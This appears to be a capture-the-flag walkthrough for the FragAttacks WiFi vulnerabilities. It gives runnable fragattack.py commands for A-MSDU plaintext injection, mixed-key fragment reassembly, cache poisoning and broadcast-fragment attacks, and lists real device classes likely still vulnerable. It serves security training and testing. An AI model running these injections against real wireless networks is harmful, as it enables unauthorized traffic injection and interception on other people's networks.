# FragAttacks — walkthrough

Twelve CVEs. Two headline paths — A-MSDU flag confusion (plaintext-
inject) and mixed-key fragment reassembly. Both require MC-MitM plus
crafted-frame injection. Vanhoef's PoC repo drives most of the
mechanics.

## Preconditions

- Target with unpatched WiFi stack (see `recognition.md`).
- MC-MitM setup (see `mc-mitm/walkthrough.md`).
- Scapy or Vanhoef's `fragattack.py` for crafted frame injection.

## Invocation shape

`fragattack.py` takes a single wireless iface (not `-mon` suffix —
the script manages monitor mode) plus test-name and IP flags:

```
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 <test-name>
```

`--ip` is the attacker's chosen IP; `--peerip` is the AP/router IP the
target is expected to answer. The script's success signal is an ICMP
echo response landing back at the attacker.

## Path A — A-MSDU flag confusion (CVE-2020-24588)

The idea: inject a plaintext frame the client parses as an A-MSDU
subframe destined for itself. Real test names in `fragattacks`:
`amsdu-inject` (SPP A-MSDU injection), `amsdu-bad` (A-MSDU with bad
checksum, forces some stacks to still parse), `ping I,E,E` (plaintext
inject) and `ping I,E,D` (encrypted mixed).

```
# 1. MC-MitM channel setup.
# 2. Bring the target into your rogue's ambit; ensure MitM is up.
# 3. Craft a plaintext A-MSDU frame with Is-Aggregate bit set,
#    destined for the client, containing an inner frame you control.

git clone https://github.com/vanhoefm/fragattacks
cd fragattacks
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 amsdu-inject
# variants:
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 amsdu-bad
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 ping I,E,E
```

Vanhoef's script prompts for the target MAC + AP MAC and orchestrates
the injection. On a vulnerable client, the injected inner frame is
delivered to the local IP stack as if it came from the AP.

## Path B — Mixed-key fragment cache (CVE-2020-24587)

The trick: send fragment #1 encrypted with the old (pre-rekey) key
and fragment #2 with the new key. Some receivers reassemble across
the rekey. Real test names: `ping I,E,D` (encrypted mixed with a
decrypted trailing frag), `eapol-2-frags`, `eapol-3-frags` for the
EAPOL-fragment variants.

```
# 1. Force a rekey (patient — wait for the GTK/PTK rekey interval).
# 2. Immediately after, send fragment #1 encrypted with the old key
#    but a modified fragment #2 payload from the attacker.
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 ping I,E,D
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 eapol-2-frags
```

## Path C — Fragment cache poisoning at (re)connect (CVE-2020-24586)

Some stacks don't clear the fragment cache on disconnect. Fill the
cache with attacker-controlled fragments before the victim
reconnects; the reconnect flushes it into the packet stream. Real
test names: `cache-inject-1`, `cache-inject-2` (variants for
different clearing behaviors), plus the `linux-plain` /
`linux-plain-mc` tests for Linux-specific plaintext cache paths.

```
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 cache-inject-1
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 linux-plain
```

## Path D — Broadcast fragment plaintext acceptance

Some clients accept plaintext broadcast fragments inside an
encrypted BSS. Real test names: `broadcast-frag` and
`broadcast-eapol`.

```
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 broadcast-frag
sudo python3 fragattack.py wlan1 \
    --ip 192.168.1.100 --peerip 192.168.1.1 broadcast-eapol
```

## Reading the results

`fragattack.py` embeds a probe: on success the target answers an ICMP
echo whose payload identifies the primitive. Successful reception on
the attacker iface = vulnerable.

For WCTF, the flag surface is usually:

- **Plaintext-inject** delivering a crafted DNS query the puzzle
  scoring bot answers with the flag.
- **Mixed-key reassembly** yielding a decrypt-then-print of a
  target frame.
- **Cache poison** landing a pre-crafted flag-carrying frame in the
  victim's IP stack.

## Failure modes

- **Target is patched.** All FragAttacks CVEs have vendor patches
  since 2021. Fingerprint the target OS first.
- **MC-MitM not clean.** If the victim's driver flips channels or
  the rogue-side clone loses track, the frame timing gets off and
  the injection window closes.
- **Client-driver's fragmentation cache implemented correctly.** The
  paper enumerates which combinations are exploitable; not every
  patched CVE is the *only* one on a given stack.
- **PMF-required + all fragments encrypted.** Path A closes; Path B
  still applies if a rekey happens.

## 2026-target expectations

- Thin WiFi front-ends (ESP32 pre-firmware-4, Realtek microcontroller
  units) — some vulnerable stacks linger.
- Old embedded APs (industrial gear from 2015–2018).
- End-of-life client devices.

## Cite

- Vanhoef 2020 — Fragment and Forge (USENIX Security 2021).
- vanhoefm/fragattacks GitHub — PoC scripts.
- Design CVEs: CVE-2020-24586, 24587, 24588. Implementation CVEs:
  CVE-2020-26139, 26140, 26141, 26142, 26143, 26144, 26145, 26146,
  26147. 12 total.
- attacks.json: `fragattacks-plaintext-inject`,
  `fragattacks-mixed-key`, `fragattacks-cache-poisoning`.
